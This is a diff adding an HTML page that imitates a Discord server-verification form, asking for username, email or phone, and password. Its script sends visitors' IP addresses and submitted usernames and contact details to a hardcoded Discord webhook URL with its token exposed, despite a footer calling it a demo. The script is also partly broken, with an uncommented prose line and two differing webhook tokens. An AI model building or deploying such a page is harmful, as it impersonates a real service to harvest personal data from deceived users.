@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Server Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        :root {
+            --discord-primary: #5865F2;
+            --discord-dark: #36393F;
+            --discord-darker: #2F3136;
+            --discord-light: #40444B;
+            --discord-text: #DCDDDE;
+            --discord-green: #57F287;
+            --discord-red: #ED4245;
+        }
+
+        body {
+            background: linear-gradient(135deg, #2f3136 0%, #202225 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: var(--discord-text);
+        }
+
+        .verification-container {
+            background: var(--discord-dark);
+            width: 100%;
+            max-width: 480px;
+            border-radius: 8px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .header {
+            background: var(--discord-primary);
+            padding: 24px;
+            text-align: center;
+            position: relative;
+        }
+
+        .header h1 {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .logo-inner {
+            background: var(--discord-darker);
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            animation: pulse 2s infinite;
+        }
+
+        .logo-inner i {
+            font-size: 40px;
+            color: var(--discord-primary);
+        }
+
+        .form-container {
+            padding: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #B9BBBE;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            background: var(--discord-darker);
+            border: 1px solid rgba(0, 0, 0, 0.3);
+            border-radius: 4px;
+            color: var(--discord-text);
+            font-size: 16px;
+            transition: all 0.2s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--discord-primary);
+            box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.3);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--discord-primary);
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:hover {
+            background: #4752C4;
+            transform: translateY(-2px);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: rgba(255, 255, 255, 0.1);
+            transform: rotate(30deg);
+            transition: all 0.6s ease;
+        }
+
+        .btn:hover::after {
+            transform: rotate(30deg) translate(20%, 20%);
+        }
+
+        .verification-message {
+            background: rgba(88, 101, 242, 0.1);
+            border: 1px solid rgba(88, 101, 242, 0.3);
+            border-radius: 4px;
+            padding: 15px;
+            margin: 25px 0;
+            text-align: center;
+            display: none;
+            animation: slideIn 0.4s ease;
+        }
+
+        .verification-message p {
+            margin-bottom: 10px;
+            color: var(--discord-text);
+        }
+
+        .verification-message strong {
+            color: var(--discord-text);
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .step {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--discord-light);
+            margin: 0 8px;
+            transition: all 0.3s ease;
+        }
+
+        .step.active {
+            background: var(--discord-primary);
+            transform: scale(1.2);
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .code-inputs input {
+            width: 15%;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            background: var(--discord-darker);
+            border: 1px solid rgba(0, 0, 0, 0.3);
+            border-radius: 4px;
+            color: var(--discord-text);
+            transition: all 0.2s ease;
+        }
+
+        .code-inputs input:focus {
+            border-color: var(--discord-primary);
+            box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.3);
+        }
+
+        .resend-link {
+            text-align: center;
+            margin-top: 20px;
+            color: #00AFF4;
+            cursor: pointer;
+            font-size: 14px;
+            display: none;
+        }
+
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid var(--discord-light);
+            color: #72767D;
+            font-size: 14px;
+        }
+
+        .footer a {
+            color: #00AFF4;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            background: rgba(237, 66, 69, 0.1);
+            border: 1px solid rgba(237, 66, 69, 0.3);
+            color: var(--discord-red);
+            padding: 12px;
+            border-radius: 4px;
+            margin: 15px 0;
+            display: none;
+            animation: shake 0.5s;
+        }
+
+        .success-message {
+            background: rgba(87, 242, 135, 0.15);
+            border: 1px solid rgba(87, 242, 135, 0.3);
+            padding: 15px;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+            animation: slideIn 0.4s ease;
+        }
+
+        @media (max-width: 500px) {
+            .form-container {
+                padding: 20px;
+            }
+            
+            .header {
+                padding: 20px 15px;
+            }
+            
+            .code-inputs input {
+                height: 50px;
+                font-size: 20px;
+            }
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { 
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(88, 101, 242, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(88, 101, 242, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(88, 101, 242, 0); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-container">
+        <div class="header">
+            <div class="logo">
+                <div class="logo-inner">
+                    <i class="fab fa-discord"></i>
+                </div>
+            </div>
+            <h1>Server Verification</h1>
+            <p>Complete verification to access the server</p>
+        </div>
+        
+        <div class="form-container">
+            <div class="step-indicator">
+                <div class="step active"></div>
+                <div class="step"></div>
+                <div class="step"></div>
+            </div>
+            
+            <form id="registerForm">
+                <div class="form-group">
+                    <label for="discordUsername">Discord Username</label>
+                    <input type="text" id="discordUsername" placeholder="username#1234" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="contactInfo">Email or Phone Number</label>
+                    <input type="text" id="contactInfo" placeholder="you@example.com or +1234567890" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                
+                <button type="submit" class="btn">Verify Account</button>
+            </form>
+            
+            <div class="verification-message" id="verificationMessage">
+                <p><i class="fas fa-envelope"></i> Sent a verification email to <strong id="emailDisplay"></strong></p>
+                <p>Please enter the 6-digit code below:</p>
+            </div>
+            
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-exclamation-circle"></i> <span id="errorText">Invalid verification code. Please try again.</span>
+            </div>
+            
+            <div class="success-message" id="successMessage">
+                <p><i class="fas fa-check-circle" style="color:#57F287;"></i> Verification successful!</p>
+                <p>Welcome to the server, <strong id="welcomeUsername"></strong>!</p>
+                <p>You now have full access to the server.</p>
+            </div>
+            
+            <div class="code-inputs" id="codeInputs">
+                <input type="text" maxlength="1" data-index="0" autocomplete="off">
+                <input type="text" maxlength="1" data-index="1" autocomplete="off">
+                <input type="text" maxlength="1" data-index="2" autocomplete="off">
+                <input type="text" maxlength="1" data-index="3" autocomplete="off">
+                <input type="text" maxlength="1" data-index="4" autocomplete="off">
+                <input type="text" maxlength="1" data-index="5" autocomplete="off">
+            </div>
+            
+            <div class="resend-link" id="resendLink">
+                Didn't receive the code? <a href="#" id="resendBtn">Resend</a>
+            </div>
+            
+            <div class="footer">
+                <p>By registering, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></p>
+                <p style="margin-top: 10px; font-size: 12px; color: #5c5f65;">For testing purposes only. This is a demo.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Log IP address for testing (will be removed in production)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    console.log('User IP:', data.ip);
+                     In a real scenario, you would send this to your webhook
+                     fetch('https://discord.com/api/webhooks/1388139167103582218/OTZHoiUd0w-XiBleGI5w_U8iE2rfZuQhpA6AT7Yo8n-iofiK1xWQVaxqFjEx0WBPJ6rtL', {
+                         method: 'POST',
+                         headers: {'Content-Type': 'application/json'},
+                         body: JSON.stringify({ ip: data.ip, event: 'page_visit' })
+                     });
+                });
+
+            const registerForm = document.getElementById('registerForm');
+            const verificationMessage = document.getElementById('verificationMessage');
+            const codeInputs = document.getElementById('codeInputs');
+            const resendLink = document.getElementById('resendLink');
+            const emailDisplay = document.getElementById('emailDisplay');
+            const contactInput = document.getElementById('contactInfo');
+            const steps = document.querySelectorAll('.step');
+            const errorMessage = document.getElementById('errorMessage');
+            const successMessage = document.getElementById('successMessage');
+            const welcomeUsername = document.getElementById('welcomeUsername');
+            const resendBtn = document.getElementById('resendBtn');
+            
+            // Handle form submission
+            registerForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const discordUsername = document.getElementById('discordUsername').value;
+                const contactValue = contactInput.value;
+                const password = document.getElementById('password').value;
+                
+                console.log('Form submitted:', { discordUsername, contactValue});
+                 fetch('https://discord.com/api/webhooks/1388139167103582218/OTZHoiUd0w-XiBleGI5w_U8iE2rfZuQhpA6AT7Yo8n-iofiK1xWQVaxqFjEx0WBPJ6rt', {
+                     method: 'POST',
+                     headers: {'Content-Type': 'application/json'},
+                     body: JSON.stringify({ 
+                         discordUsername, 
+                         contactValue, 
+                         event: 'form_submission'
+                     })
+                 });
+                
+                emailDisplay.textContent = contactValue;
+                
+                // Show verification section
+                verificationMessage.style.display = 'block';
+                codeInputs.style.display = 'flex';
+                resendLink.style.display = 'block';
+                registerForm.style.display = 'none';
+                errorMessage.style.display = 'none';
+                
+                // Update step indicator
+                steps[0].classList.remove('active');
+                steps[1].classList.add('active');
+                
+                // Focus first code input
+                setTimeout(() => {
+                    document.querySelector('.code-inputs input[data-index="0"]').focus();
+                }, 300);
+            });
+            
+            // Handle code inputs
+            const codeInputElements = document.querySelectorAll('.code-inputs input');
+            
+            codeInputElements.forEach(input => {
+                input.addEventListener('input', function() {
+                    if (this.value) {
+                        const nextIndex = parseInt(this.dataset.index) + 1;
+                        if (nextIndex < 6) {
+                            codeInputElements[nextIndex].focus();
+                        } else {
+                            this.blur();
+                            verifyCode();
+                        }
+                    }
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value) {
+                        const prevIndex = parseInt(this.dataset.index) - 1;
+                        if (prevIndex >= 0) {
+                            codeInputElements[prevIndex].focus();
+                        }
+                    }
+                });
+            });
+            
+            // Verify code function
+            function verifyCode() {
+                let code = '';
+                codeInputElements.forEach(input => {
+                    code += input.value;
+                });
+                
+                if (code.length === 6) {
+                    // For testing, only 111111 is valid
+                    if (code === '111111') {
+                        // Show success
+                        welcomeUsername.textContent = document.getElementById('discordUsername').value;
+                        verificationMessage.style.display = 'none';
+                        codeInputs.style.display = 'none';
+                        resendLink.style.display = 'none';
+                        errorMessage.style.display = 'none';
+                        successMessage.style.display = 'block';
+                        
+                        // Update step indicator
+                        steps[1].classList.remove('active');
+                        steps[2].classList.add('active');
+                    } else {
+                        // Show error
+                        errorMessage.style.display = 'block';
+                        codeInputElements.forEach(input => input.value = '');
+                        codeInputElements[0].focus();
+                    }
+                }
+            }
+            
+            // Resend code functionality
+            resendBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Show sending message
+                const originalMessage = verificationMessage.innerHTML;
+                verificationMessage.innerHTML = `
+                    <p><i class="fas fa-sync-alt fa-spin"></i> Sending a new code to <strong>${contactInput.value}</strong>...</p>
+                `;
+                
+                // Simulate sending
+                setTimeout(() => {
+                    verificationMessage.innerHTML = originalMessage;
+                    
+                    // Show notification
+                    const notification = document.createElement('p');
+                    notification.innerHTML = '<i class="fas fa-check"></i> New code sent successfully!';
+                    notification.style.color = '#57F287';
+                    notification.style.marginTop = '10px';
+                    verificationMessage.appendChild(notification);
+                    
+                    codeInputElements.forEach(input => input.value = '');
+                    codeInputElements[0].focus();
+                    errorMessage.style.display = 'none';
+                    
+                    setTimeout(() => {
+                        notification.remove();
+                    }, 3000);
+                }, 1500);
+            });
+        });
+    </script>
+</body>
+</html>
